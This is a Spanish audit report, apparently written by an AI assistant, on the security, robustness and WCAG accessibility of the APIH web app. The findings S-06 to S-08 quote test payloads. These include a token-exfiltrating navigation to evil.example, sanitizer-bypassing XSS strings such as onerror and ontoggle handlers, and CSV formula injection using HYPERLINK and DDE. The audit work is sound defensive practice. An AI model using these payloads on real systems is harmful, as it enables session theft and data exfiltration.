# APIH V22.52 · Revisión de accesibilidad, seguridad y robustez (rev4)

Alcance: /home/claude/apih (index.html 10.209 líneas, apih-config.js, supabase/apih_servidor.sql). Solo lectura; pruebas en copia /tmp/rev4 (puerto 8764), Playwright en modo demo. Los escenarios con servidor usaron un Supabase simulado localmente con `page.route` (sin red real, sesión inventada, sin credenciales). Scripts en /tmp/rev4/t/.

## Resumen
- Sin hallazgos Críticos verificados. 9 Altos/Medios-altos de integridad y concurrencia, 1 Alto de auditabilidad del SQL.
- Secretos: limpio. `service_role`/`secret` solo aparecen en comentarios (apih-config.js:4, docs/HANDOFF.md:9). apih-config.js contiene solo URL y clave `sb_publishable_…` (pública). Sin JWT ni claves en el árbol ni en `git log -p` (72 commits; la única coincidencia `eyJ` es el PNG base64 del logo, index.html:807).
- XSS: **no reproducido** en ningún sumidero real. Inyecté marcadores (`<u class=pwn>` y quiebre de atributos `" data-atk=`) en 100+ campos (titulo, desc, logros, mit, nombre, resp, lider, comentarios, bitácora, documentos, comités, cambios, decisiones, compromisos, usuario) y recorrí las 22 vistas, ficha, panel contextual, 5 popovers, Ctrl+K, búsqueda global, chat IA, modales de notas y el HTML de presentaciones exportadas: todo pasa por `esc()` (0 elementos inyectados). Importadores (Importar iniciativas, Completar con IA, Cargar Excel) escapan sus vistas previas. El problema es el sanitizador de respaldo (S-07), no un sumidero.
- XLSX exportado no es vulnerable (cadenas como `inlineStr`); el CSV sí (S-08).
- Rendimiento: 600 iniciativas (4.800 hitos, 1.800 riesgos), memoria 29 MB, sin fugas (750 renders: +1,5 MB). Vistas lentas: Hitos 4,6 s, Presentaciones 2,4 s, Riesgos 1,7 s.
- Recarga en demo: hay `beforeunload` cuando `DataService.dirty` (verificado); los datos se pierden por diseño.
- Offline: reintento con backoff y recuperación correctas (verificado con mock: `pending` 1 -> 0, registro llega al servidor).

---

## SEGURIDAD / ROBUSTEZ

### ALTA

**S-01 · Roles de la app y áreas solo se aplican en el cliente; el servidor no distingue área ni rol de app**
- Ubicación: SQL sección A (líneas 9-22, solo comentarios): `admin`/`editor`/lector; index.html `rolActual` 5145, `puedeEditarArea` 5150, `areaVisible` 5148, `loadRemote` 1710.
- Evidencia: `loadRemote` descarga TODAS las listas a cualquier perfil; `areaVisible`/`puedeEditarArea` filtran solo en la UI. Un "editor" (Colaborador de BISE) puede por API/consola (`St` es global) escribir iniciativas de otra área, resolver decisiones (solo "Gasto" en UI), cambiar `cfg` (p. ej. `readOnly=true` para todos, `areas`) y `cfgU` de otros. Un lector ve datos de todas las áreas.
- Impacto: la separación por área/gobernanza es cosmética; cualquier editor altera o lee todo el portafolio. Con equipo pequeño y de confianza es Media; si hay áreas con información restringida, es Alta.
- Arreglo mínimo: documentarlo como limitación del prototipo; si se requiere, columna `area` en `registros` + `perfiles.areas` y política `using (area = any(areas) or rol='admin')`; escribir `cfg`/`APIH_Config` solo `admin`.

**S-02 · Pérdida silenciosa de cambios tras un conflicto cuando hay un fallo parcial**
- Ubicación: `DataService.flush` index.html 1786-1790 (rama `this.conf`).
- Prueba (mock, /tmp/rev4/t/net2.js): edito PRJ-001 y PRJ-002 a la vez; otra persona modificó PRJ-001 (conflicto) y la red falla en PRJ-002. Resultado: `confirm()` nativo menciona solo PRJ-001; luego `this.dirty=false` + `refresh(false,true)` reemplaza TODO `St` con el servidor: la edición de PRJ-002 (fallida por red, no conflictiva) desaparece sin aviso ni en el JSON descargable; estado queda `ok` con `pending: 2` residual.
- Impacto: pérdida de trabajo del usuario sin señal; el diálogo es un `confirm()` bloqueante que además puede suprimirse en iframes/Teams.
- Arreglo mínimo: si hay `fail` u ops pendientes no conflictivas, no llamar a `refresh(..., true)`; mergear solo los registros en conflicto y volcar al JSON descargable también las ops fallidas; reemplazar `confirm()` por modal de la app.

**S-03 · Los importadores no validan esquema: un archivo mal formado deja inutilizables todas las vistas (y se persiste)**
- Ubicación: `Chg.impinifile` 3803-3830 (`Object.assign(defaults, x, …)`), `Chg.impfile` 3786 (solo comprueba `v===3` y arrays).
- Prueba (/tmp/rev4/t/imp.js, importando JSON como Gasto): (a) `{"titulo":"E1","deps":"x","tags":"s","est":"x","hist":"x"}` -> `i.deps.forEach is not a function`: las 22 vistas y la ficha lanzan excepción; (b) hito con `fecha` objeto/ausente -> `fmtD` falla (`toLowerCase`) en Hitos, ficha, presentaciones; (c) `finPlan:"no-fecha"`/`inicioPlan:5` -> `RangeError: Invalid string length` en Roadmap y fallo en Portafolio; (d) `lider` objeto -> `initials` falla.
- Impacto: un archivo erróneo (o una IA que lo genere) congela la app; con Supabase se sincroniza y rompe la carga de todos (ver S-04). Solo Gasto puede importar, pero el error es de datos, no de intención.
- Arreglo mínimo: función `normIni(x)` con lista blanca de campos y tipos (strings, números finitos, fechas `/^\d{4}-\d\d-\d\d$/`, arrays) usada por ambos importadores; descartar claves desconocidas.

**S-04 · Una sola fila inválida en `registros` hace caer a TODOS los usuarios a "modo demo"**
- Ubicación: `listItems` 1922-1935, `loadRemote` 1710, `DataService.init` 1706-1707, `backendName` 1667.
- Prueba (mock, /tmp/rev4/t/net4.js): fila con `datos` sin prefijo `p1.` -> `mode:'demo'`, 0 iniciativas, banner "Sin conexión a SharePoint…"; fila `p1.{…"deps":"x"}` -> igual (`(i.deps||[]).join is not a function`). La restricción `registros_formato_p1` es `NOT VALID` y no valida JSON. Además una fila con JSON inválido se acepta en silencio como objeto vacío (`json_invalido`: 2 iniciativas, una corrupta) y se sobrescribiría al guardar.
- Impacto: un editor (o un bug) tumba la aplicación para todos; el mensaje dice "SharePoint" aunque sea Supabase (confunde el diagnóstico).
- Arreglo mínimo: en `listItems`/`SPMap` aislar por fila con try/catch (omitir y listar "registros ilegibles" en el banner); `check (datos like 'p1.%' and (substr(datos,4))::jsonb is not null)`; usar `backendName()` en el banner de línea 2382.

**S-05 · El SQL "versionado para auditar" no contiene las políticas: RLS no verificable**
- Ubicación: apih_servidor.sql sección A (comentarios) y sección B/D (solo `alter table`, triggers, check).
- Evidencia: no hay `enable row level security`, ni `create policy`, ni `create table perfiles`, ni el trigger `apih_dominio`, ni `grant/revoke`. Las políticas `reg_leer/insertar/cambiar/borrar`, `notas_insertar`, `claves_*` solo se describen en prosa; `apih_rol()` está comentada.
- Impacto: no se puede comprobar que RLS esté activo, que las políticas sean `to authenticated`, que `perfiles` esté protegida (si `perfiles` no tiene RLS, cualquier sesión podría modificar su propio rol vía PostgREST: sería Crítica) ni que el trigger de dominio cubra INSERT y cambio de correo. **No verificado**, requiere consultar `pg_policies`/`pg_class.relrowsecurity` en el proyecto.
- Arreglo mínimo: volcar `pg_dump --schema-only` de `public` con RLS/policies/grants a este archivo (idempotente) y añadir `alter table … force row level security`.

### MEDIA

**S-06 · CSP con `'unsafe-inline'` y exfiltración posible hacia `*.sharepoint.com` y navegación**
- Ubicación: meta CSP línea 7 (`script-src 'self' 'unsafe-inline'`, `connect-src … https://*.sharepoint.com https://graph.microsoft.com`).
- Prueba (/tmp/rev4/t/csp.js): `fetch` a evil.example y `Image` externo bloqueados; `fetch` a `attacker-tenant.sharepoint.com` y `graph.microsoft.com` PERMITIDOS; `location.href='https://evil.example/?t='+sessionStorage.APIH_SB` navega (CSP no cubre navegación).
- Impacto: el comentario de la línea 6 ("impide enviar datos o tokens a un servidor ajeno") es inexacto; ante cualquier XSS el token sale. Hoy no hay sumidero alcanzable (ver S-07), pero `unsafe-inline` anula la segunda línea de defensa.
- Arreglo mínimo: no hay `onclick=` en línea (0 ocurrencias; solo 1 `<script>` en línea): mover el script a `app.js` y usar `script-src 'self'`; quitar `*.sharepoint.com`/`graph` de `connect-src` si el modo Supabase es el único activo (o fijar el tenant exacto).

**S-07 · El sanitizador `limpiarHTML` se evade (defensa en profundidad débil)**
- Ubicación: index.html 819-846 (`RISK` en 822).
- Prueba (/tmp/rev4/t/san.js, asignando a `innerHTML`): `<img src="x"onerror=…>` EJECUTA (sin espacio antes de `on…`, `\son` no coincide); `<details/open/ontoggle=…>` EJECUTA; `<svg/onload=…>` queda con el atributo; `<a href="java&#x09;script:…">` queda intacto (el regex exige `javascript` contiguo). Solo se limpia cuando RISK coincide primero.
- Impacto: la red de seguridad prometida no funciona ante payloads sin espacios; hoy sin sumidero sin `esc()` (no reproducido), por lo que es latente.
- Arreglo mínimo: no hacer pre-test con regex; parsear SIEMPRE en `<template>` y eliminar atributos `on*` y URLs peligrosas (lista blanca de etiquetas/atributos), o usar `Sanitizer`/DOMPurify local.

**S-08 · Inyección de fórmulas en CSV (=, +, -, @, tab)**
- Ubicación: `toCSV` 2107; usada en pcsv 3177, roadcsv 3288, riskcsv 3375, hitocsv 3404, bitcsv 3599, capcsv 5104, perscsv 5126.
- Prueba (/tmp/rev4/t/csv.js): `titulo='=HYPERLINK("http://evil.example/?"&A1,"clic")'` sale literal en Portfolio, Roadmap, Riesgos, Hitos y Bitácora; `lider='@SUM(1+1)…cmd|…'`, `'+1+1'`, `'\t=1+1'` idem en Personas/Capacidad/Riesgos. `toCSV` solo cita por `[",;]`.
- Impacto: cualquier colaborador puede plantar una fórmula que se ejecuta al abrir el CSV exportado en Excel por un directivo (exfiltración vía HYPERLINK, avisos DDE).
- Arreglo mínimo: en `q`, si `/^[=+\-@\t\r]/.test(v)` prefijar `'` (y aplicar solo a textos, no a números negativos conocidos).

**S-09 · `cfg`, `cfgU`, `usuarios`, `seq` son last-write-wins (confirmado)**
- Ubicación: `saveSetting` 1590, ops `t:'s'` 1745 y 1760 (sin versión).
- Prueba (mock, /tmp/rev4/t/net3.js): otro usuario añade `maria` a `cfgU`; yo añado `pedro` y guardo -> el servidor queda con `juan`+`pedro`, se pierde `maria`. `cfgU` es un único registro con las preferencias de TODOS.
- Impacto: pérdida de preferencias/ajustes de terceros; también `cfg` (parámetros de la organización).
- Arreglo mínimo: una fila por usuario (`cfgU:<correo>`) y por clave de `cfg`; o `PATCH … &actualizado=eq.` también para settings y re-merge en conflicto.

**S-10 · La detección de conflictos es cooperativa: el servidor no la impone**
- Ubicación: SQL sección D (trigger `apih_version`, solo sella `actualizado := clock_timestamp()`); `batchOps` 1944-1990 (rutas `up` por upsert y DELETE sin `actualizado=eq`).
- Evidencia: el trigger nunca compara la versión enviada; cualquier cliente que haga upsert/PATCH sin filtro pisa; `deleteItem`/DELETE por lote no verifican versión (borra un registro recién editado por otro).
- Arreglo mínimo: en el trigger `if tg_op='UPDATE' and new.actualizado is distinct from old.actualizado then raise exception 'conflicto' using errcode='40001'` (el cliente envía `actualizado` leído) y `delete … and actualizado=eq.`.

**S-11 · Los importadores permiten reasignar/duplicar registros entre proyectos (asignación masiva)**
- Ubicación: `Chg.proyiaf` 3860 (riesgos: `Object.assign({}, x||defaults, q)` y `St.riesgos.push({id, ini:i.id, ...v})`); `Chg.impinifile` (riesgos `{… ...r}` tras `ini`).
- Prueba (/tmp/rev4/t/ia.js): archivo `apih-proyecto-ia` de PRJ-001 con `riesgos:[{id:RSK-001, ini:'PRJ-002', …}]` -> RSK-001 pasa a PRJ-002 y un riesgo nuevo se crea en PRJ-002 (se esquiva la comprobación "no pertenece a este proyecto" y `puedeEditarIni`). En `impinifile`, `riesgos:[{id:'RSK-001'…}]` crea IDs duplicados (2 filas RSK-001, verificado).
- Impacto: datos fuera del área editable, IDs duplicados (colisión de claves en servidor: el segundo `c` da 409/conflicto).
- Arreglo mínimo: construir el objeto con lista blanca de claves y forzar `ini:i.id` y `id` generado después del spread; excluir `id`/`ini` del payload.

**S-12 · Refresh token en localStorage ("Recordar") y el cierre de sesión no revoca en el servidor**
- Ubicación: `SB.persist` 1860, `SB.clear/logout` 1861/1880, `SB.login` 9919.
- Evidencia: `logout()` solo borra el almacenamiento local; no llama a `/auth/v1/logout`. Con "Recordar" el refresh token persiste en `localStorage` (legible por cualquier script, ver S-06/S-07).
- Impacto: token robado o equipo compartido sigue válido hasta que expire el refresh token del proyecto.
- Arreglo mínimo: `POST /auth/v1/logout` (scope global) al salir; no ofrecer "Recordar" o limitarlo; configurar expiración/rotación en Supabase.

**S-13 · Autoría de auditoría declarada por el cliente; `modificado_por` del servidor nunca se muestra**
- Ubicación: `log()` 1008 (`autor: St.cfg.usuario`), notas 9411/9517 (`autor`, `correo` del cliente); `modificado_por` (SQL sección B): 0 usos en index.html (grep).
- Impacto: cualquier editor puede registrar eventos/comentarios "como" otra persona; la bitácora no es evidencia de auditoría. El sello del servidor existe pero no se lee.
- Arreglo mínimo: añadir `modificado_por` al `select` de `listItems` y mostrarlo/contrastarlo con `autor`; derivar `autor` del correo de la sesión.

**S-14 · Altas y contraseñas: controles solo en el cliente o no verificables**
- Ubicación: `SB2.valida` 9910 (≥10 car., letras+números, solo cliente); flujo "Primera vez" 9937; trigger `apih_dominio` (no versionado).
- Evidencia: el servidor aplica la política que tenga configurada Supabase (por defecto 6 car.); un dominio `@aramark.cl` no prueba propiedad del correo: si "Confirm email" estuviera desactivado, cualquiera registraría la dirección de un colega con perfil y heredaría su rol. **No verificado** (requiere ver Auth > Settings).
- Arreglo mínimo: confirmar "Confirm email" activo, longitud mínima/`HIBP` en Auth, y MFA si el plan lo permite; deshabilitar signup público si las cuentas se crean por invitación.

**S-15 · Rendimiento con 500+ iniciativas: render completo y sin virtualizar**
- Prueba (/tmp/rev4/t/perf.js, 602 ini / 4.822 hitos / 1.807 riesgos / 1.500 eventos, 2 MB JSON): Hitos 4.624 ms (82.768 nodos DOM), Presentaciones 2.380 ms, Riesgos 1.673 ms, Portafolio 950 ms, Proyectos 865 ms, Gantt 808 ms, Dashboard 725 ms; resto <650 ms. `save()` 14 ms, búsqueda global 17 ms, memoria 29 MB.
- Impacto: bloqueo de 2-5 s por vista a esa escala; irrelevante para decenas de proyectos (prototipo congelado).
- Arreglo mínimo: paginar/limitar filas (p. ej. 100 con "ver más") en Hitos, Riesgos y Presentaciones.

### BAJA

**S-16 · Clickjacking: sin `frame-ancestors`**: la meta CSP (línea 7) no admite `frame-ancestors` ni se puede enviar `X-Frame-Options` en GitHub Pages; no hay frame-buster. Prueba: la página carga en un `<iframe>` de otro origen (/tmp/rev4/t/fv.js, el iframe se crea; sin bloqueo). Arreglo: `if (top!==self) top.location=self.location` o página puente; hospedar con cabeceras al migrar.

**S-17 · Identidad de administrador por nombre y correo codificados en el cliente**: `ADMIN_USERS` 1075 y `ADMIN_EMAILS` 1079; `esAdminReal` 1082 hace `startsWith(nombre + ' ')` sobre el nombre derivado del correo. Un homónimo (`christian.tolosa.x@…`) obtiene rol Gasto en la UI; además `SB.sess.email` en storage es editable por el usuario (solo afecta la UI; el servidor usa el JWT). Expone un correo corporativo en el repositorio. Arreglo: decidir por correo exacto o por `perfiles.rol` devuelto por el servidor.

**S-18 · Clave de equipo heredada aún activa**: políticas `claves_insertar/claves_cambiar` y excepción de formato para `APIH_Claves` siguen vigentes hasta ejecutar la sección C (líneas 49-55, comentadas). El cliente ya no usa `APIH_Claves` (0 usos en index.html). Arreglo: ejecutar C y quitar la excepción del `check`.

**S-19 · Enlace de recuperación en el hash (`#access_token=…&refresh_token=…&type=recovery`)**: se limpia con `replaceState` solo tras guardar la contraseña (9969); un enlace fabricado inicia sesión con la cuenta del atacante (fijación de sesión; requiere que el atacante tenga perfil). No reproducido; revisión de código. Arreglo: validar el token con `/auth/v1/user` antes de mostrar el formulario y limpiar el hash al cargar.

**S-20 · Errores de consola en uso normal: ninguno** (todas las vistas, con y sin datos; solo 404 de `apih-config.js` cuando el demo se sirve sin él). Informativo.

---

## ACCESIBILIDAD (WCAG 2.1 AA)

### ALTA

**A-01 · Calendario no operable con teclado (2.1.1, nivel A)**
- Ubicación: Views.calendario 3449, celdas `<div class="cd" data-act="cday">` 3426.
- Prueba (/tmp/rev4/t/kb.js): 35 celdas con `tabindex=-1`, sin rol ni nombre; la vista tiene solo 7 paradas de tabulación. No se puede abrir un día ni su lista de eventos con teclado.
- Arreglo mínimo: `<button class="cd" aria-label="12 de octubre, 2 eventos">` o `role="gridcell"` + `tabindex=0` + flechas.

**A-02 · Gantt: barras, filas e hitos solo con clic (2.1.1, 4.1.2)**
- Ubicación: Views.gantt 3292.
- Prueba (a11y1.js): 27 elementos `div.g-lr/div.g-bar/i.g-ms[data-act=sel]` sin foco ni rol; el SVG de dependencias (1 gráfico grande) sin nombre. Los datos solo existen en barras con tooltip.
- Arreglo mínimo: `g-lr` como `<button>` (o `tabindex=0 role=button`) y alternativa tabular (ya hay datos en Portafolio) enlazada con "Ver como tabla"; `role="img" aria-label` en el SVG.

### MEDIA

**A-03 · Controles interactivos no nativos sin foco/rol en varias vistas (2.1.1, 4.1.2)**
- Ubicación: Dashboard tabla "Proyecto/RAG" 3061 (`tr[data-act=sel]`: 2/2 filas sin ruta de teclado), Mi cocina `span.cs-m[startip]` (24 elementos), `p.xt[xtext]` (expandir texto) en Proyectos/Propuestas/Hitos/Bitácora/Cielo/Presentaciones, Decisiones `h3[sel]`, `div.brand[go]` (logo del encabezado).
- Nota: Riesgos, Hitos y Portafolio sí tienen enlace/botón dentro de la fila (7/7, 22/22, 2/2).
- Arreglo mínimo: el handler global (2306) ya soporta `[role=button][data-act]` y `article.icard`: añadir `role="button" tabindex="0"` a estos elementos.

**A-04 · Diálogos sin `aria-modal` ni trampa de foco: recorrido inicial y Ctrl+K**
- Ubicación: `v22-tour` 9855 (role=dialog, sin aria-modal), `Acts.cmdk` 2444 (role=dialog, sin aria-modal, sin `role=combobox/listbox`).
- Prueba (tour.js, kb2.js): tras 8 Tab el foco sale del recorrido hacia la app de fondo (`inside tour: false`); `#app` no queda `inert` en ninguno de los dos; la lista de resultados de Ctrl+K no tiene roles ni `aria-activedescendant`. El `Modal` estándar sí es correcto (`inert`, trampa, retorno de foco: verificado).
- Arreglo mínimo: reutilizar `Modal` (inert + trampa) o añadir `aria-modal` + wrap de Tab; roles combobox/listbox en la paleta.

**A-05 · Errores de formulario solo en toast efímero, sin `aria-invalid`/`aria-required` (3.3.1, 3.3.3, 4.1.3, 2.2.1)**
- Ubicación: `toast` 2026 (desaparece a los 3,2 s, `role=status aria-live=polite` incluso para errores), `Acts.msave` 2321, `fieldHTML` 2063.
- Prueba (kb5.js): guardar el modal vacío -> toast "Completa: …", 0 campos con `aria-invalid`, obligatorios marcados solo con `*` visual (`.req`, 0 `aria-required`). El foco sí va al primer campo vacío (correcto).
- Arreglo mínimo: `role="alert"` para toasts `err`, `aria-required`/`aria-invalid` + mensaje por campo con `aria-describedby`, y no autodescartar errores.

**A-06 · Campos sin etiqueta accesible (1.3.1, 3.3.2, 4.1.2)**
- Prueba (a11y1.js): buscador global `#gs` solo con placeholder (todas las vistas); Bitácora: `#bt-ini`, `#bt-tema`, `#bt-txt`; Administración y Mi configuración: 7 inputs numéricos/texto cada una (`unidad`, `decMaxDias`, `tolDesv`, …); chat IA `#chatq`. Los formularios modales sí están bien etiquetados (acunew, chgnew: 0 sin label).
- Arreglo mínimo: `aria-label` en estos controles (el placeholder no es nombre fiable).

**A-07 · Contraste insuficiente (1.4.3), sobre todo en tema oscuro**
- Prueba (contrast.js, cálculo propio de contraste con fondo efectivo; /tmp/rev4/t/g_dark.png): oscuro: insignias del menú blanco/azul 3,1:1 (11 px), botón activo "Simple" 3,0:1, enlace "Saltar al contenido" 3,0:1, iniciales de avatar 3,0:1 (8-9 px), etiqueta de grupo en Gantt 1,7:1 (chip claro con texto claro), `em.red` 4,46:1; claro: `small` 4,25:1 en Portafolio, texto blanco 85 % 3,95:1 en tabla de riesgos. Además `.gsearch input::placeholder{color:#BCBCBC}` sobre fondo blanco al enfocar ≈1,9:1.
- Arreglo mínimo: subir tokens `--tx3`/chips y colores de insignia en `data-theme=dark`; placeholder ≥4,5:1.

### BAJA

**A-08 · Popovers (Avisos, Nuevo, Más…)**: el contenedor no tiene `role`/`aria-label`, el foco no entra al abrir (`focusInside:false`); `aria-expanded` y el retorno de foco con Esc sí funcionan (verificado). Arreglo: `role="dialog"`/`menu` + mover foco al primer elemento.

**A-09 · Cambio de vista no se anuncia**: tras activar un ítem del menú el foco queda en el botón del menú; no hay región `aria-live` ni foco a `#main` (que existe con `tabindex=-1` y enlace "Saltar"). Arreglo: `main.focus()` o anunciar el título en `go()`. (El cambio de `document.title` por vista no se comprobó: no reproducido.)

**A-10 · Objetivos pequeños (<24 px)**: Hitos 44 controles, Administración 39, Mi configuración 60, Presentaciones 26, Riesgos 7 (a11y1.js). WCAG 2.2 AA (2.5.8); WCAG 2.1 AA no lo exige (AAA = 44 px). Arreglo: padding mínimo 24 px en `.btn.sm`/chips.

**A-11 · Reflow a 320 px**: a 200 % (viewport 640) no hay scroll horizontal de página (0 px en 11 vistas); las tablas desbordan dentro de `#main` (aceptable para tablas de datos). A 320 px Mi configuración tiene 43 elementos que sobresalen y Administración 6. Arreglo: `min-width:0; flex-wrap` en esas rejillas.

**A-12 · Foco en el buscador global**: `.gsearch input{outline:none}` (línea 27); el foco se indica solo cambiando el fondo a blanco (sin borde/outline). Cumple de forma marginal 2.4.7; añadir `outline` visible.

---

## Lo que está bien (verificado)
- `esc()` consistente; 0 sumideros sin escapar encontrados; documentos con lista blanca de host (`docUrlOk` 10148); exportación HTML de presentaciones escapada.
- Modal estándar: `role=dialog`, `aria-modal`, `inert` en `#app`, trampa de Tab y retorno de foco; Esc cierra; `lang="es"`, enlace "Saltar al contenido", `prefers-reduced-motion` (211, 732), `forced-colors`, viewport sin bloqueo de zoom, `:focus-visible` global (15), tablas con `th scope`, regiones `main`/`nav`, toasts con `role=status`.
- Sesión: tokens en `sessionStorage` por defecto, refresh serializado (`SB.refrescar`), reintentos con backoff, timeout 30 s, conflicto por versión en PATCH.
